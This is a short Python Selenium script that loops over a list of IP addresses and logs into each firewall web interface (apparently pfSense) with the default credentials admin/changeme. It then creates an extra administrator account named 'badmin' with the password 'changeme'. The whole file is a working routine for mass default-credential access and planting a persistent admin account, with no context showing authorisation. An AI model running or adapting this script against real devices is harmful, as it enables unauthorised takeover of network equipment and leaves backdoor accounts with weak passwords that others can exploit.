from selenium import webdriver
import time
from selenium.webdriver.support.ui import Select

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
chrome_options.add_argument("--start-maximized")
chrome_options.add_argument("--ignore-certificate-errors")
driver = webdriver.Chrome('chromedriver.exe', chrome_options=chrome_options)
driver.set_page_load_timeout(20)
driver.implicitly_wait(5)
ip_provided =[]
for x in ip_provided:
    driver.get(f"http://{x}/")
    driver.find_element_by_name('usernamefld').send_keys('admin')
    driver.find_element_by_id('passwordfld').send_keys(f"changeme\n")
    driver.get(f"http://{x}/system_usermanager.php")
    driver.find_element_by_xpath("//a[contains(@href, '?act=new')]").click()
    driver.find_element_by_name('usernamefld').send_keys('badmin')
    driver.find_element_by_id('passwordfld1').send_keys(f"changeme")
    driver.find_element_by_id('passwordfld2').send_keys(f"changeme")
    select = Select(driver.find_element_by_id('sysgroups[]'))
    select.select_by_visible_text('admins')
    driver.find_element_by_id('movetoenabled').click()
    driver.find_element_by_id('save').click()
driver.close()